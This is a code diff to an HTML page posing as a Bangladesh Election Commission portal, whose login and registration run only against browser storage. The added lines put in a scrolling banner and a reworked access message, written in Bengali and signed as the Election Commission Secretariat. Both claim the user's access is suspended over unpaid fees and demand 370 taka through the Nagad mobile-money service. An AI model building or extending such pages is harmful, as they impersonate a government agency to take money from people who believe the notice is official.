@@ -9,6 +9,36 @@
         body { font-family: Arial, Helvetica, sans-serif; background: #f4f6f9; min-height: 100vh; }
         .header { background: #0b5ed7; color: white; padding: 15px; text-align: center; font-size: 20px; font-weight: bold; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }
         .logo { width: 50px; margin-right: 10px; }
+        
+        /* আধুনিক সিএসএস রোলিং নোটিশ বার */
+        .notice-container {
+            background: #ffdbdb;
+            border-bottom: 2px solid #dc3545;
+            overflow: hidden;
+            position: relative;
+            padding: 12px 0;
+            display: flex;
+            align-items: center;
+        }
+        .notice-text {
+            display: inline-block;
+            white-space: nowrap;
+            padding-left: 100%;
+            color: #dc3545;
+            font-weight: bold;
+            font-size: 16px;
+            animation: text-roll 25s linear infinite;
+        }
+        /* নোটিশের ওপর মাউস রাখলে লেখাটি থামবে */
+        .notice-container:hover .notice-text {
+            animation-play-state: paused;
+        }
+        /* রোলিং অ্যানিমেশন কিফ্রেম */
+        @keyframes text-roll {
+            0% { transform: translate3d(0, 0, 0); }
+            100% { transform: translate3d(-100%, 0, 0); }
+        }
+
         .container { display: flex; flex-direction: row; min-height: calc(100vh - 60px); }
         .sidebar { width: 220px; background: #fff; border-right: 1px solid #ddd; }
         .sidebar ul { list-style: none; }
@@ -37,6 +67,7 @@
 
         #accessMessage { color: red; font-weight: bold; margin-top: 20px; text-align: center; }
         .back-btn { margin-bottom: 15px; width: auto; }
+        .result-box { margin-top: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 8px; background: #fafafa; }
     </style>
 </head>
 <body>
@@ -83,6 +114,14 @@
             </div>
             <button class="btn" onclick="logout()">লগআউট</button>
         </div>
+
+        <!-- সিএসএস অ্যানিমেশন নোটিশ বার -->
+        <div class="notice-container">
+            <div class="notice-text">
+                ⚠️ দুঃখিত আপনার পোর্টাল এক্সেস এর মূল্য বৃদ্ধির কারনে আপনার এক্সেস স্থগিত রয়েছে, অনুগ্রহ করে নগদ নাম্বারে বকেয়া ৩৭০ টাকা পরিশোধ করুন, ধন্যবাদ। বাংলাদেশ নির্বাচন কমিশন সচিবালয়।।
+            </div>
+        </div>
+
         <div class="container">
             <div class="sidebar">
                 <ul>
@@ -112,7 +151,7 @@
             document.getElementById("loginForm").style.display = "none"; 
             document.getElementById("registerForm").style.display = "block"; 
         });
-
+        
         document.getElementById("showLogin").addEventListener("click", e => { 
             e.preventDefault(); 
             document.getElementById("registerForm").style.display = "none"; 
@@ -125,6 +164,7 @@
             const pass = document.getElementById("regPassword").value.trim();
             const regMsg = document.getElementById("regMessage");
             if (!user || !pass) return;
+            
             const existing = localStorage.getItem("ecUser");
             if (existing) {
                 regMsg.innerHTML = `<button onclick="resetAccount()" class="btn" style="background:#dc3545;margin-top:10px;">পুরানো অ্যাকাউন্ট মুছে নতুন রেজিস্টার করুন</button>`;
@@ -132,7 +172,7 @@
                 return;
             }
             localStorage.setItem("ecUser", JSON.stringify({ userid: user, password: pass }));
-            regMsg.innerHTML = `<span class="success">রেজিস্ট্রেশন সফল হয়েছে। লগইন পেজে ফিরে যাচ্ছি...</span>`;
+            regMsg.innerHTML = `<span class="success">রেজিস্ট্রেশন সফল হয়েছে। লগইন করুন...</span>`;
             setTimeout(() => {
                 document.getElementById("registerForm").style.display = "none";
                 document.getElementById("loginForm").style.display = "block";
@@ -140,27 +180,36 @@
             }, 1500);
         });
 
-        window.resetAccount = function() { localStorage.removeItem("ecUser"); location.reload(); };
+        window.resetAccount = function() { 
+            localStorage.removeItem("ecUser"); 
+            location.reload(); 
+        };
 
+        // লগইন
         document.getElementById("loginForm").addEventListener("submit", e => {
             e.preventDefault();
             const user = document.getElementById("userid").value.trim();
             const pass = document.getElementById("password").value.trim();
-            const stored = JSON.parse(localStorage.getItem("ecUser"));
+            const stored = JSON.parse(localStorage.getItem("ecUser") || "{}");
+
             if (!stored || stored.userid !== user || stored.password !== pass) {
                 document.getElementById("message").innerHTML = `<span class="error">ইউজার আইডি অথবা পাসওয়ার্ড ভুল।</span>`;
                 return;
             }
+
             document.getElementById("message").innerHTML = "";
             showLoading();
+
             setTimeout(() => {
                 hideLoading();
                 document.getElementById("loginContainer").style.display = "none";
                 document.getElementById("dashboard").style.display = "block";
-            }, 1000);
+            }, 1200);
         });
 
-        function logout() { location.reload(); }
+        function logout() { 
+            location.reload(); 
+        }
 
         function showForm(type) {
             document.getElementById("accessMessage").innerHTML = "";
@@ -180,10 +229,10 @@
                 fields = `<input type="text" id="formnoInput" class="form-control" placeholder="ফর্ম নাম্বার">`;
             } else if (type === "correction") {
                 title = "সংশোধন অনুমোদন";
-                fields = `<input type="text" id="correctionInput" class="form-control" placeholder="জাতীয় পরিচয় পত্র নাম্বার / আবেদন কপি নাম্বার">`;
+                fields = `<input type="text" id="correctionInput" class="form-control" placeholder="জাতীয় পরিচয় পত্র নাম্বার / আবেদন কপি নাম্বার">`;
             }
 
-            const html = `<button class="btn back-btn" onclick="backToDefault()">ফিরে যান</button><h3>${title}</h3>${fields}<button class="btn" onclick="search('${type}')">সার্চ</button><div id="resultArea"></div>`;
+            const html = `<button class="btn back-btn" onclick="backToDefault()">فিরে যান</button><h3>${title}</h3>${fields}<button class="btn" onclick="search('${type}')">সার্চ</button><div id="resultArea"></div>`;
             document.getElementById("formArea").innerHTML = html;
         }
 
@@ -206,8 +255,9 @@
             }
 
             document.getElementById("accessMessage").innerHTML = `
-                <div style="color: red; font-weight: bold; padding: 15px; border: 1px solid #f5c6cb; background: #f8d7da; border-radius: 8px;">
-                    দুঃখীত আপনার পোর্টালে নির্বাচন কমিশনের এক্সেস যুক্ত নেই, অনুগ্রহ করে এক্সেস যুক্ত করে তারপর পোর্টাল ব্যবহার করুন। ধন্যবাদ। (বাংলাদেশ নির্বাচন কমিশন সচিবালয়)।
+                <div style="color: red; font-weight: bold; padding: 20px; border: 2px solid #f5c6cb; background: #f8d7da; border-radius: 8px; margin-top: 20px;">
+                    দুঃখিত আপনার পোর্টালে নির্বাচন কমিশনের এক্সেস স্থগিত রয়েছে।<br>
+                    অনুগ্রহ করে বকেয়া (৳৩৭০) পরিশোধ করুন। পোর্টাল অটোমেটিক ভাবে এক্সেস যুক্ত এবং সচল হয়ে যাবে। ধন্যবাদ।  বাংলাদেশ নির্বাচন কমিশন সচিবালয়।
                 </div>
             `;
 
